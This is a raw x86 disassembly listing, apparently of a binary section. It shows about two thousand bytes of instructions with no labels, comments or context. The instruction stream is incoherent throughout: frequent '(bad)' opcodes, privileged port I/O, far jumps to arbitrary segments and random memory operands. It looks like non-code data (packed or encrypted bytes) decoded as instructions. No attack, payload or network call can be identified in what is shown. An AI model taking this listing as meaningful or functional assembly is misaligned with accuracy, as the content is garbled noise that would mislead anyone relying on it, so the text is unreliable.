  41a1fb:	sbb    BYTE PTR [ecx-0x7d],bh
  41a1fe:	mov    esi,0x7865a8c7
  41a203:	jmp    0x41a1b6
  41a205:	sbb    al,0x3d
  41a207:	mov    edx,0x4670ba4b
  41a20c:	jnp    0x41a1f2
  41a20e:	cld    
  41a20f:	mov    bl,0x54
  41a211:	dec    ebp
  41a212:	je     0x41a1cd
  41a214:	mov    ch,0x53
  41a216:	xor    al,0xc8
  41a218:	jae    0x41a1a9
  41a21a:	lock cwde 
  41a21c:	mov    edx,0xebfe3b20
  41a221:	jne    0x41a1d7
  41a223:	gs sub eax,0xf5187c01
  41a229:	(bad)  
  41a22b:	dec    edi
  41a22c:	xor    BYTE PTR [ebx],0xc
  41a22f:	sbb    eax,0x2ce096de
  41a234:	xor    bl,bh
  41a236:	shr    DWORD PTR ds:[edx+0x3bfb3bc8],1
  41a23d:	loopne 0x41a256
  41a23f:	dec    ebp
  41a240:	add    eax,0x4434e679
  41a245:	pop    ds
  41a246:	pop    eax
  41a247:	aas    
  41a248:	mov    al,0x5e
  41a24a:	cld    
  41a24b:	push   es
  41a24c:	mov    dh,0x6c
  41a24e:	test   al,0xd5
  41a250:	mov    edi,DWORD PTR [ebp+0x59e7e46]
  41a256:	add    esp,DWORD PTR [edx-0x15ee1cde]
  41a25c:	jno    0x41a293
  41a25e:	ror    DWORD PTR [eax+0x48],0x95
  41a262:	mov    ch,0x14
  41a264:	out    0xb9,eax
  41a266:	pop    ds
  41a267:	sbb    DWORD PTR [edx+0x7ad17cd3],ebp
  41a26d:	jp     0x41a215
  41a26f:	mov    edi,0x1d0f33cd
  41a274:	imul   edi,DWORD PTR [edi+0x44],0x12
  41a278:	aad    0xc0
  41a27a:	mov    es,WORD PTR [esi-0x61]
  41a27d:	(bad)  
  41a27e:	std    
  41a27f:	(bad)  
  41a280:	dec    esi
  41a281:	ja     0x41a2fd
  41a283:	mov    BYTE PTR [ebx-0x3b],al
  41a286:	stos   DWORD PTR es:[edi],eax
  41a287:	fisttp WORD PTR [edx-0x2445a4dc]
  41a28d:	fpatan 
  41a28f:	or     ah,ch
  41a291:	jmp    0x35c4:0xcf60f656
  41a298:	jmp    0x41a251
  41a29a:	out    0x69,eax
  41a29c:	sar    BYTE PTR [esi-0x204be82d],0x4a
  41a2a3:	push   esp
  41a2a4:	pop    esp
  41a2a5:	jns    0x41a24c
  41a2a7:	xor    edi,DWORD PTR [ebx-0x1b]
  41a2aa:	sub    eax,0x7e42e14a
  41a2af:	enter  0x3259,0x28
  41a2b3:	xor    BYTE PTR [eax+0x54],al
  41a2b6:	loop   0x41a27e
  41a2b8:	mov    ds:0x15443b98,eax
  41a2bd:	pop    ds
  41a2be:	xor    ebx,DWORD PTR [edx]
  41a2c0:	rol    BYTE PTR [edx],1
  41a2c2:	hlt    
  41a2c3:	xor    DWORD PTR ds:0x5c88799b,ecx
  41a2c9:	jne    0x41a32d
  41a2cb:	aaa    
  41a2cc:	xchg   esi,eax
  41a2cd:	(bad)  
  41a2cf:	dec    ebx
  41a2d0:	xor    eax,0x3dae8306
  41a2d5:	cld    
  41a2d6:	cld    
  41a2d7:	and    al,0xd7
  41a2d9:	mov    ds:0x5b9e88dd,al
  41a2de:	in     eax,dx
  41a2df:	(bad)  
  41a2e0:	mov    cl,0x7c
  41a2e2:	and    DWORD PTR [edi+0x57510b2e],esi
  41a2e8:	jmp    0x41a29a
  41a2ea:	sbb    DWORD PTR [esi-0x3601b935],edx
  41a2f0:	lods   eax,DWORD PTR ds:[esi]
  41a2f1:	into   
  41a2f2:	ds into 
  41a2f4:	jmp    0x9830:0xcb7ab852
  41a2fb:	shl    ecx,cl
  41a2fd:	push   ss
  41a2fe:	std    
  41a2ff:	adc    DWORD PTR [edx-0x55],esp
  41a302:	popf   
  41a303:	dec    edi
  41a304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a305:	imul   edx,esi,0x83e886c7
  41a30b:	outs   dx,DWORD PTR ds:[esi]
  41a30c:	xchg   edx,eax
  41a30d:	popa   
  41a30e:	in     al,0xd5
  41a310:	in     eax,dx
  41a311:	cmp    ecx,esi
  41a313:	inc    esp
  41a314:	lahf   
  41a315:	add    BYTE PTR [edi-0x57],cl
  41a318:	mov    ebx,0xbe8b6c52
  41a31d:	fisttp WORD PTR [edi+edx*8]
  41a320:	jmp    0xdafb9b18
  41a325:	in     al,0x2
  41a327:	mov    ebx,0x7abd8cef
  41a32c:	xlat   BYTE PTR ds:[ebx]
  41a32d:	movzx  ebx,sp
  41a330:	push   0xbbcfbf0
  41a335:	fisttp WORD PTR [esi]
  41a337:	out    dx,eax
  41a338:	jbe    0x41a2c3
  41a33a:	mov    eax,ds:0x11a4aff0
  41a33f:	rcl    BYTE PTR [eax],cl
  41a341:	shr    BYTE PTR [ecx-0x245019c7],0x26
  41a348:	jmp    0x41a38b
  41a34a:	inc    ebx
  41a34b:	jo     0x41a2f4
  41a34d:	fisttp WORD PTR [eax]
  41a34f:	outs   dx,BYTE PTR cs:[esi]
  41a351:	rol    BYTE PTR [ebx],cl
  41a353:	dec    edx
  41a354:	push   edi
  41a355:	adc    eax,0xb219f7fd
  41a35a:	sti    
  41a35b:	xor    DWORD PTR [esi+0x1fc8c25e],edi
  41a361:	fnsave [esi]
  41a363:	jmp    0xb266318d
  41a368:	xchg   ebp,eax
  41a369:	mov    dh,0x1
  41a36b:	add    bh,bl
  41a36d:	xchg   edi,eax
  41a36e:	jl     0x41a383
  41a370:	dec    edx
  41a371:	hlt    
  41a372:	jge    0x41a38f
  41a374:	sub    al,0xdf
  41a376:	and    DWORD PTR [esi],ecx
  41a378:	scas   eax,DWORD PTR es:[edi]
  41a379:	aas    
  41a37a:	pushf  
  41a37b:	cld    
  41a37c:	jp     0x41a332
  41a37e:	cld    
  41a37f:	dec    esi
  41a380:	int    0xa1
  41a382:	dec    ebx
  41a383:	mov    eax,ds:0xc8910894
  41a388:	gs xchg esp,eax
  41a38a:	je     0x41a3c5
  41a38c:	inc    eax
  41a38d:	and    al,BYTE PTR [ecx-0x64b4f89b]
  41a393:	pop    ebp
  41a394:	jmp    0x41a403
  41a396:	push   edi
  41a397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a398:	cmp    edi,DWORD PTR [ebp-0x1cc948d0]
  41a39e:	out    0xc0,al
  41a3a0:	aam    0xb5
  41a3a2:	sbb    eax,0xa4b96908
  41a3a7:	call   0xf6f31096
  41a3ac:	mov    edi,0x411bb9ae
  41a3b1:	js     0x41a350
  41a3b3:	xchg   ebp,eax
  41a3b4:	pop    es
  41a3b5:	pusha  
  41a3b6:	pop    edx
  41a3b7:	enter  0x8c6,0x31
  41a3bb:	cld    
  41a3bc:	or     dh,al
  41a3be:	inc    esi
  41a3bf:	les    esi,FWORD PTR [edi]
  41a3c1:	daa    
  41a3c2:	jae    0x41a38c
  41a3c4:	xchg   ebx,eax
  41a3c5:	xchg   ebx,eax
  41a3c6:	out    dx,eax
  41a3c7:	xor    eax,0xc86fbda0
  41a3cc:	jge    0x41a3de
  41a3ce:	jl     0x41a3ca
  41a3d0:	aaa    
  41a3d1:	dec    eax
  41a3d2:	and    esp,DWORD PTR [esi]
  41a3d4:	jmp    0x41a452
  41a3d6:	aaa    
  41a3d7:	or     DWORD PTR [edx+esi*1],0x3d8aa697
  41a3de:	adc    al,0x2e
  41a3e0:	pandn  mm3,QWORD PTR [esi+0x43c3bb00]
  41a3e7:	jne    0x41a39c
  41a3e9:	into   
  41a3ea:	cld    
  41a3eb:	(bad)  
  41a3ec:	lods   eax,DWORD PTR ds:[esi]
  41a3ed:	out    dx,eax
  41a3ee:	getsec 
  41a3f0:	and    eax,0xdc8c3a3
  41a3f5:	pop    ds
  41a3f6:	pop    esp
  41a3f7:	dec    edx
  41a3f8:	adc    ebp,DWORD PTR [edi+0x69]
  41a3fb:	xchg   edx,eax
  41a3fc:	cmc    
  41a3fd:	xor    BYTE PTR [ebp+edi*1-0x76fe1d15],ch
  41a404:	sti    
  41a405:	idiv   DWORD PTR [ebx-0x3902af38]
  41a40b:	add    edx,DWORD PTR [esi+ebp*2+0x66]
  41a40f:	arpl   bx,bp
  41a411:	sub    al,0x99
  41a413:	dec    esi
  41a414:	sbb    eax,0xe5f6dd7
  41a419:	loopne 0x41a3b4
  41a41b:	or     eax,0xd8ca82c7
  41a420:	pop    ds
  41a421:	jnp    0x41a450
  41a423:	mov    ebx,ebp
  41a425:	test   eax,0xad719a46
  41a42a:	dec    ebx
  41a42b:	inc    ebp
  41a42c:	pop    esp
  41a42d:	fst    DWORD PTR [ecx]
  41a42f:	test   DWORD PTR [esi+0x382cfcab],ebx
  41a435:	in     al,0x64
  41a437:	cmp    al,0xeb
  41a439:	cmp    al,0xc8
  41a43b:	push   ebx
  41a43c:	in     al,0xa3
  41a43e:	in     eax,dx
  41a43f:	test   eax,0x16460524
  41a444:	imul   edi,DWORD PTR [esi+0x65921ca1],0xffffff8d
  41a44b:	daa    
  41a44c:	loope  0x41a4c1
  41a44e:	add    eax,0x20ace94b
  41a453:	push   es
  41a454:	fisubr WORD PTR [edi-0xe]
  41a457:	mov    ebp,0x6294dff8
  41a45c:	int3   
  41a45d:	add    al,0xef
  41a45f:	pushf  
  41a460:	mov    esi,0xb521fcb3
  41a465:	clc    
  41a466:	pop    eax
  41a467:	in     al,0x9d
  41a469:	rcr    DWORD PTR [edi+0x23edae0],1
  41a46f:	or     BYTE PTR [edx+0x3ce35df],bh
  41a475:	je     0x41a4e9
  41a477:	jg     0x41a464
  41a479:	ret    
  41a47a:	(bad)  
  41a47b:	cmc    
  41a47c:	xchg   esi,eax
  41a47d:	sub    eax,0x88a8a1a4
  41a482:	repz or DWORD PTR ds:0xeb67fb21,esp
  41a489:	xchg   edi,eax
  41a48a:	mov    edi,0x28ca9a8b
  41a48f:	daa    
  41a490:	neg    bh
  41a492:	in     eax,dx
  41a493:	xchg   ecx,eax
  41a494:	xchg   ecx,eax
  41a495:	gs add eax,0xfd112e7f
  41a49b:	mov    al,0x5c
  41a49d:	aam    0xc6
  41a49f:	iret   
  41a4a0:	stos   DWORD PTR es:[edi],eax
  41a4a1:	jmp    0x467c6cd9
  41a4a6:	xor    BYTE PTR ds:[esi+esi*8+0x3],bh
  41a4ab:	fs int 0xac
  41a4ae:	out    0x42,eax
  41a4b0:	hlt    
  41a4b1:	addr16 clc 
  41a4b3:	(bad)  
  41a4b4:	and    al,0x9d
  41a4b6:	in     al,0xbf
  41a4b8:	popf   
  41a4b9:	fistp  QWORD PTR [edi+0x2950faa]
  41a4bf:	outs   dx,DWORD PTR ds:[esi]
  41a4c0:	xor    eax,0x3f9cfc94
  41a4c5:	jge    0x41a4d1
  41a4c7:	int3   
  41a4c8:	mov    bl,0xed
  41a4ca:	push   eax
  41a4cb:	enter  0x19ab,0xdc
  41a4cf:	std    
  41a4d0:	imul   ebx,eax,0x4b
  41a4d3:	dec    ebp
  41a4d4:	jmp    0x41a50f
  41a4d6:	push   es
  41a4d7:	sbb    edx,DWORD PTR ds:0xcfab9889
  41a4dd:	ficom  WORD PTR [esi]
  41a4df:	leave  
  41a4e0:	loope  0x41a4b3
  41a4e2:	add    eax,ebx
  41a4e4:	out    0x2b,eax
  41a4e6:	xor    al,0x9b
  41a4e8:	jmp    0x41a495
  41a4ea:	(bad)  
  41a4eb:	retf   
  41a4ec:	cli    
  41a4ed:	mov    BYTE PTR [ecx-0x5],bh
  41a4f0:	pop    ebp
  41a4f1:	fld    DWORD PTR [esi+0x7d4a1d79]
  41a4f7:	dec    ecx
  41a4f8:	mov    eax,0xeb2b3f47
  41a4fd:	inc    edx
  41a4fe:	jg     0x41a50f
  41a500:	inc    ebp
  41a501:	lahf   
  41a502:	xlat   BYTE PTR ds:[ebx]
  41a503:	xchg   ebp,eax
  41a504:	fcmovu st,st(7)
  41a506:	mov    eax,DWORD PTR ds:0x6824c3ac
  41a50c:	cli    
  41a50d:	inc    ebp
  41a50e:	std    
  41a50f:	inc    ebp
  41a510:	inc    ebx
  41a511:	dec    edi
  41a512:	push   0xffffffdf
  41a514:	mov    dh,0x8e
  41a516:	call   0x3f21dbbb
  41a51b:	pop    ebp
  41a51c:	jno    0x41a4ad
  41a51e:	retf   
  41a51f:	pop    edi
  41a520:	inc    esi
  41a521:	mov    WORD PTR [edx],ss
  41a523:	cmp    ah,ch
  41a525:	add    BYTE PTR gs:[esi],ch
  41a528:	jmp    0x41a4d2
  41a52a:	fisttp QWORD PTR [edx-0x4f]
  41a52d:	mov    esp,0xdf08b88f
  41a532:	sbb    ch,bl
  41a534:	out    dx,al
  41a535:	sbb    DWORD PTR [ebp-0x11],esi
  41a538:	adc    bl,BYTE PTR [eax-0x5efc1e04]
  41a53e:	out    dx,al
  41a53f:	js     0x41a4cc
  41a541:	pop    ss
  41a542:	stos   BYTE PTR es:[edi],al
  41a543:	enter  0xe954,0x75
  41a547:	stos   DWORD PTR es:[edi],eax
  41a548:	dec    ebp
  41a549:	dec    edx
  41a54a:	pop    esp
  41a54b:	test   eax,0x7edcb5eb
  41a550:	dec    eax
  41a551:	popa   
  41a552:	mov    ah,ah
  41a554:	or     cl,bl
  41a556:	xor    DWORD PTR [eax],0xaebd1415
  41a55c:	push   esp
  41a55d:	or     DWORD PTR [edx-0x3d55b97],0xd2cf28ce
  41a567:	cmp    eax,0x88835b9
  41a56c:	retf   
  41a56d:	xor    al,0x27
  41a56f:	fist   WORD PTR [eax+ecx*2-0x3]
  41a573:	mov    edx,0x8107c4b0
  41a578:	and    eax,0xe1878565
  41a57d:	imul   ebp,DWORD PTR [ebx],0x48
  41a580:	lock aam 0x8d
  41a583:	pop    ebp
  41a584:	data16 mov ds:0x1ab49003,al
  41a58a:	loope  0x41a52e
  41a58c:	std    
  41a58d:	jmp    0x41a5b7
  41a58f:	or     BYTE PTR [ebx-0x7a],al
  41a592:	adc    edx,DWORD PTR [esi]
  41a594:	clc    
  41a595:	fsub   st,st(5)
  41a597:	lods   al,BYTE PTR ds:[esi]
  41a598:	mov    DWORD PTR [ebx+0x2c26c88f],ebx
  41a59e:	jmp    0x41a5f8
  41a5a0:	icebp  
  41a5a1:	xchg   ecx,eax
  41a5a2:	mov    ebp,0xdbfe80ce
  41a5a7:	cmc    
  41a5a8:	mov    ebp,DWORD PTR [ecx]
  41a5aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5ab:	pushf  
  41a5ac:	js     0x41a629
  41a5ae:	std    
  41a5af:	div    BYTE PTR [edi+0x44]
  41a5b2:	adc    bh,dl
  41a5b4:	test   eax,0xfc89d0a
  41a5b9:	sti    
  41a5ba:	in     al,dx
  41a5bb:	and    DWORD PTR [ecx-0x148384b5],0x49
  41a5c2:	xchg   edx,eax
  41a5c3:	xchg   ebp,eax
  41a5c4:	loope  0x41a57a
  41a5c6:	xchg   edx,eax
  41a5c7:	cmp    BYTE PTR ds:0xaca514df,al
  41a5cd:	fcomp  DWORD PTR [ecx-0x5ec5bd5]
  41a5d3:	or     DWORD PTR [ecx-0xf],0xa82a7109
  41a5da:	xchg   BYTE PTR [eax],dl
  41a5dc:	and    DWORD PTR [esi-0x2036d9b4],ebp
  41a5e2:	cwde   
  41a5e3:	ins    DWORD PTR es:[edi],dx
  41a5e4:	cld    
  41a5e5:	retf   
  41a5e6:	popa   
  41a5e7:	pop    ds
  41a5e8:	pop    esi
  41a5e9:	cli    
  41a5ea:	clc    
  41a5eb:	daa    
  41a5ec:	jmp    0x1507:0x6b8dbe5a
  41a5f3:	xor    eax,0x9984df47
  41a5f8:	push   edi
  41a5f9:	ja     0x41a628
  41a5fb:	or     al,0x95
  41a5fd:	fimul  DWORD PTR [eax]
  41a5ff:	dec    ebx
  41a600:	add    DWORD PTR [edi-0x5d553776],0xa47aac4d
  41a60a:	push   0xffffffc7
  41a60c:	jae    0x41a64b
  41a60e:	in     al,0x60
  41a610:	daa    
  41a611:	jmp    FWORD PTR [edi-0x314e23b]
  41a617:	cli    
  41a618:	les    esi,FWORD PTR [ebx+edx*4]
  41a61b:	test   BYTE PTR [edi+0x6f],ah
  41a61e:	inc    edi
  41a620:	retf   0xa957
  41a623:	cmp    eax,0x22de2ba4
  41a628:	add    BYTE PTR [esi-0x1fd4ea7a],dl
  41a62e:	ret    0x14d6
  41a631:	dec    ebp
  41a632:	fdivr  QWORD PTR [ebp+0x4801438f]
  41a638:	or     edx,DWORD PTR [edx]
  41a63a:	mov    dh,0x89
  41a63c:	and    BYTE PTR [esi-0x3],dl
  41a63f:	fisub  WORD PTR [edx+0x309307e8]
  41a645:	push   esp
  41a646:	mov    ebx,0x36de29c9
  41a64b:	push   ds
  41a64c:	aas    
  41a64d:	pop    ss
  41a64e:	cli    
  41a64f:	adc    ebx,esi
  41a651:	dec    edi
  41a652:	add    edi,DWORD PTR [esi+0x61]
  41a655:	sub    DWORD PTR ds:0x353549c4,edi
  41a65b:	mov    ecx,0xb05de6a
  41a660:	pop    edx
  41a661:	jae    0x41a62a
  41a663:	icebp  
  41a664:	dec    esp
  41a665:	pop    ds
  41a666:	into   
  41a667:	rcr    DWORD PTR [ebx],cl
  41a669:	data16 std 
  41a66b:	sub    BYTE PTR [ebp-0x7f],ch
  41a66e:	aam    0xe2
  41a670:	add    BYTE PTR [edi],ah
  41a672:	xlat   BYTE PTR ds:[ebx]
  41a673:	in     eax,0x13
  41a675:	retf   
  41a676:	mov    al,ds:0x848740c8
  41a67b:	push   es
  41a67c:	(bad)  
  41a67d:	xor    bh,ch
  41a67f:	mov    dl,0x14
  41a681:	outs   dx,DWORD PTR ds:[esi]
  41a682:	jl     0x41a64d
  41a684:	outs   dx,BYTE PTR ds:[esi]
  41a685:	or     BYTE PTR [ebx-0x21c3d041],cl
  41a68b:	xchg   dl,dh
  41a68d:	inc    ebx
  41a68e:	pop    esp
  41a68f:	cmp    BYTE PTR [edi-0x14e3798c],dh
  41a695:	mov    ebp,0x52c0b7d8
  41a69a:	dec    ebx
  41a69b:	jns    0x41a67f
  41a69d:	(bad)  
  41a69f:	fist   WORD PTR [edx]
  41a6a1:	out    0x91,al
  41a6a3:	pop    edi
  41a6a4:	rol    DWORD PTR [ebx-0x3b],cl
  41a6a7:	cld    
  41a6a8:	enter  0x9cca,0x80
  41a6ac:	jle    0x41a68d
  41a6ae:	fist   WORD PTR [ecx-0x2]
  41a6b1:	push   esi
  41a6b2:	inc    eax
  41a6b3:	inc    edi
  41a6b4:	jo     0x41a658
  41a6b6:	stc    
  41a6b7:	jbe    0x41a697
  41a6b9:	inc    ebx
  41a6ba:	js     0x41a6db
  41a6bc:	jmp    0x41a6f5
  41a6be:	aam    0xd2
  41a6c0:	dec    ebp
  41a6c1:	mov    bl,0x99
  41a6c3:	enter  0x2d55,0x2e
  41a6c7:	mov    esi,0x8447f12a
  41a6cc:	jmp    0x41a74a
  41a6ce:	(bad)
  41a6d1:	(bad)
  41a6d4:	in     al,0xd9
  41a6d6:	jo     0x41a6a2
  41a6d8:	mov    ebx,DWORD PTR fs:[ebp+0x4bdb63ba]
  41a6df:	stc    
  41a6e0:	jmp    0x41a6e4
  41a6e2:	retf   
  41a6e3:	aaa    
  41a6e4:	fwait
  41a6e5:	sub    edi,DWORD PTR ds:[edi]
  41a6e8:	inc    esi
  41a6e9:	fild   QWORD PTR [eax+0x13]
  41a6ec:	cs and eax,0xc62b2243
  41a6f2:	bnd ja 0x41a74a
  41a6f5:	repz scas al,BYTE PTR es:[edi]
  41a6f7:	test   al,0xe8
  41a6f9:	mov    ecx,0xdf3662ad
  41a6fe:	addr16 push esp
  41a700:	jmp    0xa7f386b6
  41a705:	lahf   
  41a706:	ins    BYTE PTR es:[edi],dx
  41a707:	leave  
  41a708:	loop   0x41a75e
  41a70a:	call   0xffe1:0x5585d0c8
  41a711:	mov    ebp,0x46ecc826
  41a716:	cmp    esi,DWORD PTR [ebp-0x46]
  41a719:	xor    BYTE PTR [ebx-0x22],bl
  41a71c:	setp   ah
  41a71f:	mov    al,ds:0x473a2fa2
  41a724:	(bad)  
  41a725:	jae    0x41a70f
  41a727:	jnp    0x41a762
  41a729:	daa    
  41a72a:	inc    BYTE PTR [eax+0x31]
  41a72d:	int3   
  41a72e:	cmp    al,0x55
  41a730:	sahf   
  41a731:	push   DWORD PTR [edi-0x3d1f8ea]
  41a737:	push   es
  41a738:	in     eax,0x59
  41a73a:	dec    ecx
  41a73b:	mov    ds:0x17eb244a,eax
  41a740:	sbb    ebx,DWORD PTR [edi-0x72]
  41a743:	xchg   esp,eax
  41a744:	xor    ebx,edi
  41a746:	mov    ds:0xecc70d20,al
  41a74b:	popf   
  41a74c:	sub    BYTE PTR [eax-0x3],dh
  41a74f:	adc    ch,0xa8
  41a752:	iret   
  41a753:	(bad)  
  41a754:	ja     0x41a7bf
  41a756:	(bad)
  41a75a:	jle    0x41a6f9
  41a75c:	sub    al,0xac
  41a75e:	out    dx,eax
  41a75f:	pop    eax
  41a760:	in     al,dx
  41a761:	pop    eax
  41a762:	daa    
  41a763:	popa   
  41a764:	cmp    edi,eax
  41a766:	bound  ebx,QWORD PTR [edi-0x37bb1cbd]
  41a76c:	sub    esi,DWORD PTR [edx-0x4e]
  41a76f:	sbb    al,0x86
  41a771:	repnz push ebx
  41a773:	std    
  41a774:	add    BYTE PTR [edx+0x7c],dh
  41a777:	sub    eax,0x58f33793
  41a77c:	fs popf 
  41a77e:	aas    
  41a77f:	enter  0xa058,0xd5
  41a783:	sbb    dh,BYTE PTR [esi]
  41a785:	fbstp  TBYTE PTR [ebx-0x11daf8de]
  41a78b:	mov    eax,ds:0xee955448
  41a790:	jmp    0xd94b28b6
  41a795:	(bad)  
  41a796:	(bad)
  41a79a:	les    ecx,FWORD PTR [ecx-0x7b]
  41a79d:	in     eax,0xa8
  41a79f:	mov    ds:0xd6b1df0b,eax
  41a7a4:	inc    eax
  41a7a5:	pop    ds
  41a7a6:	fidiv  WORD PTR [esi+0x24fcff39]
  41a7ac:	out    0x87,al
  41a7ae:	add    al,0x38
  41a7b0:	loope  0x41a7e0
  41a7b2:	add    cl,dl
  41a7b4:	xchg   edx,eax
  41a7b5:	lahf   
  41a7b6:	add    al,0x7b
  41a7b8:	mov    ss,WORD PTR [ebx]
  41a7ba:	sbb    eax,0xfb129ace
  41a7bf:	cmc    
  41a7c0:	(bad)  
  41a7c2:	or     al,0x16
  41a7c4:	neg    esi
  41a7c6:	mov    ebx,0xc78a7e26
  41a7cb:	ficomp DWORD PTR [esi+0x43]
  41a7ce:	imul   ebx,DWORD PTR [esi],0xffffffeb
  41a7d1:	lahf   
  41a7d2:	mov    al,ds:0x1c43595c
  41a7d7:	mov    dh,BYTE PTR [edx]
  41a7d9:	fbld   TBYTE PTR [esi]
  41a7db:	adc    DWORD PTR [ebp+edx*2-0xf],edx
  41a7df:	mov    ch,0xed
  41a7e1:	or     bh,ch
  41a7e3:	xor    ah,cl
  41a7e5:	clc    
  41a7e6:	fmul   DWORD PTR [eax-0x57eb22d0]
  41a7ec:	std    
  41a7ed:	push   edi
  41a7ee:	pop    edx
  41a7ef:	aam    0xe
  41a7f1:	or     ebp,edi
  41a7f3:	jp     0x41a7e3
  41a7f5:	mov    bl,0x65
  41a7f7:	adc    ebp,DWORD PTR [ebp+0x445ff9e0]
  41a7fd:	fistp  WORD PTR [edi+esi*4]
  41a800:	mov    DWORD PTR [eax-0x26],edi
  41a803:	push   ecx
  41a804:	pop    ebp
  41a805:	aad    0x3
  41a807:	ret    
  41a808:	cdq    
  41a809:	push   es
  41a80a:	mov    ah,0xf4
  41a80c:	jmp    0x6bfef0d3
  41a811:	shl    eax,cl
  41a813:	add    cl,bl
  41a815:	cmp    edi,DWORD PTR ds:0xd3df6a32
  41a81b:	cwde   
  41a81c:	fs pop ds
  41a81e:	(bad)  
  41a81f:	push   eax
  41a820:	popa   
  41a821:	add    eax,0xe710d1fd
  41a826:	jp     0x41a893
  41a828:	pop    eax
  41a829:	sti    
  41a82a:	(bad)  
  41a82b:	enter  0x453a,0xf4
  41a82f:	imul   edi,DWORD PTR [eax],0xeb78efcf
  41a835:	mov    al,0x4c
  41a837:	hlt    
  41a838:	div    DWORD PTR ds:0x62d199e
  41a83e:	test   eax,0x9b273b06
  41a843:	enter  0xe2a2,0xbf
  41a847:	xchg   esp,eax
  41a848:	and    ah,0x1e
  41a84b:	cdq    
  41a84c:	jmp    0x41a8ac
  41a84e:	js     0x41a859
  41a850:	ins    DWORD PTR es:[edi],dx
  41a851:	vsqrtss xmm2,xmm3,DWORD PTR [ecx]
  41a855:	(bad)  
  41a857:	loop   0x41a808
  41a859:	retf   
  41a85a:	scas   eax,DWORD PTR es:[edi]
  41a85b:	sar    BYTE PTR ds:0x3256fd6b,0x2a
  41a862:	xor    BYTE PTR [ebx+0x6b],0xd4
  41a866:	xchg   esp,eax
  41a867:	enter  0x4a9,0x7
  41a86b:	dec    edx
  41a86c:	aaa    
  41a86d:	loope  0x41a8b2
  41a86f:	adc    al,0xe6
  41a871:	(bad)  
  41a872:	int    0xd0
  41a874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a875:	daa    
  41a876:	ins    BYTE PTR es:[edi],dx
  41a877:	pop    ss
  41a878:	stos   DWORD PTR es:[edi],eax
  41a879:	adc    esp,DWORD PTR cs:[esi]
  41a87c:	push   ebp
  41a87d:	fist   WORD PTR [esp+ebx*2-0xc]
  41a881:	scas   al,BYTE PTR es:[edi]
  41a882:	mov    ?,WORD PTR [edi+0x42]
  41a885:	(bad)  
  41a886:	(bad)  
  41a887:	jb     0x41a869
  41a889:	call   0xcb1:0x81449ad
  41a890:	inc    esp
  41a891:	fbld   TBYTE PTR [ebx-0x6e]
  41a894:	dec    ebx
  41a895:	or     eax,0xd13239af
  41a89a:	cld    
  41a89b:	ret    0x1630
  41a89e:	or     bl,0x4
  41a8a1:	fs adc ecx,eax
  41a8a4:	mov    dl,BYTE PTR [edi]
  41a8a6:	ret    0x215e
  41a8a9:	jae    0x41a87a
  41a8ab:	bnd jmp 0x41a8f6
  41a8ae:	xchg   BYTE PTR [ecx+0x29233941],dh
  41a8b4:	fbstp  TBYTE PTR [edi]
  41a8b7:	and    al,0x59
  41a8b9:	in     al,dx
  41a8ba:	test   al,bl
  41a8bc:	ret    0xfd88
  41a8bf:	imul   eax,DWORD PTR [eax],0xffffffc8
  41a8c2:	xor    dh,BYTE PTR [edx-0x1ce4b3bc]
  41a8c8:	xchg   edx,eax
  41a8c9:	xor    BYTE PTR [eax],al
  41a8cb:	test   al,0xbc
  41a8cd:	push   esi
  41a8ce:	mov    fs,WORD PTR [ebp+0x7b]
  41a8d1:	mov    ebx,0x9eb056e
  41a8d6:	and    al,0xea
  41a8d8:	fbstp  TBYTE PTR [edx]
  41a8da:	ret    
  41a8db:	jo     0x41a8c7
  41a8dd:	fwait
  41a8de:	addr16 sbb ebx,ebp
  41a8e1:	jo     0x41a8f3
  41a8e3:	call   0xe1eb:0xfd1abd67
  41a8ea:	jnp    0x41a8b0
  41a8ec:	pop    ebx
  41a8ed:	int3   
  41a8ee:	lahf   
  41a8ef:	cli    
  41a8f0:	rcr    edi,cl
  41a8f2:	mov    dh,0x82
  41a8f4:	push   eax
  41a8f5:	xchg   edx,eax
  41a8f6:	or     eax,0xfd7e4be8
  41a8fb:	sub    BYTE PTR [ecx+0x70d61451],dl
  41a901:	cmp    si,cx
  41a904:	mov    cl,0x93
  41a906:	mov    BYTE PTR [ebx-0x17870a9a],bh
  41a90c:	aas    
  41a90d:	mov    ebx,0x73eb8c20
  41a912:	fcmovu st,st(0)
  41a914:	stc    
  41a915:	push   esi
  41a916:	push   es
  41a917:	mov    esp,0xeda0df19
  41a91c:	das    
  41a91d:	mov    dh,0x82
  41a91f:	xor    bl,BYTE PTR [ebx+0x32]
  41a922:	and    eax,DWORD PTR [ecx+0x4fd875b]
  41a928:	jle    0x41a908
  41a92a:	fisubr WORD PTR [ebp+0x67]
  41a92d:	jmp    0x9df6:0xf87cc8b8
  41a934:	scas   al,BYTE PTR es:[edi]
  41a935:	test   BYTE PTR ds:0xa49f7b14,0xcf
  41a93c:	jmp    0x41a921
  41a93e:	xor    eax,eax
  41a940:	std    
  41a941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a942:	mov    BYTE PTR [edx+eiz*2+0x727490df],al
  41a949:	lahf   
  41a94a:	pop    esp
  41a94b:	adc    DWORD PTR [ebp-0x77],esp
  41a94e:	std    
  41a94f:	cmp    ebx,DWORD PTR [edx-0x51235080]
  41a955:	ret    0xc84f
  41a958:	dec    ecx
  41a959:	and    eax,0x44d0a0c1
  41a95e:	pushf  
  41a95f:	pop    edx
  41a960:	jmp    0x41a9b5
  41a962:	das    
  41a963:	popa   
  41a964:	dec    ebp
  41a965:	rol    DWORD PTR [ecx-0x4a],0x30
  41a969:	(bad)  
  41a96b:	ret    
  41a96c:	mov    ebx,0x56a7ca39
  41a971:	dec    eax
  41a972:	(bad)  
  41a973:	mov    esi,0x13da71fd
  41a978:	inc    eax
  41a979:	xchg   edi,eax
  41a97a:	sub    al,0xcc
  41a97c:	out    dx,eax
  41a97d:	fist   WORD PTR ds:0x7fd9ec0e
  41a983:	int    0xad
  41a985:	dec    ecx
  41a986:	inc    ebp
  41a987:	cmp    ecx,eax
  41a989:	jmp    0x50d9:0x4c2b644b
  41a990:	xor    al,0x26
  41a992:	shl    eax,0xaf
  41a995:	add    bh,ch
  41a997:	or     dh,BYTE PTR [ebp-0x106b232f]
  41a99d:	lahf   
  41a99e:	out    0xe1,al
  41a9a0:	dec    ebx
  41a9a1:	(bad)  
  41a9a3:	ret    
  41a9a4:	fs loopne 0x41aa0d
  41a9a7:	xchg   edi,edi
